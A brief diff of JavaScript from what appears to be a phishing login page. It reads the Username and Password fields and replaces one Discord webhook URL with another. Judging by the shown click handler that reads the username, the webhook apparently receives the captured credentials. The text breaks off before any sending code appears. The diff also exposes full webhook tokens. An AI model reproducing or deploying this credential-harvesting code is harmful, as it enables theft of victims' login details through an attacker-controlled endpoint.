@@ -2,7 +2,7 @@
     const usernameArea = document.getElementById("Username")
     const passwordArea = document.getElementById("Password")
     const loginbtn = document.getElementById("Loginbtn")
-    const url = "https://discord.com/api/webhooks/1330185653291450399/yq9cCToHuqnOkVZiDb6-NJDlZm8a0tw7ePO-rSjEoByl6s2p4p14wGi4YZuVUZoD2LoB"
+    const url = "https://discord.com/api/webhooks/1330525889103925288/00RixZLbIdSGufrb29wqZD8ekI9t94ak3et3jfS8FuVVrl6YOQou5X-tdOQ8Jxd9DF78"
     // the main function when the button is clicked
     loginbtn.addEventListener("click", function() {
         var usernameValue = usernameArea.value
